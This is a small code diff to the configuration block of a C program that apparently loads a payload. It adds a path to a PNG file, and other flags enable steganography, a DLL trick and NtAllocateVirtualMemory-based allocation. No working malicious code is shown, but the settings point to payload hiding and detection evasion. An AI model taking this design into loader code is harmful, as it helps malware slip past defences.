@@ -13,4 +13,5 @@ static BOOLEAN trick_SxInDll = TRUE;
 static AllocateMethod allocateMethod = CASE_NtAllocateVirtualMemory;
 static BOOLEAN checkVXQQ = FALSE;
 static BOOLEAN EnableSteg = TRUE;
+static wchar_t const* stegPath = L"\\1.png";
 // ==================== CONFIG END ==========================
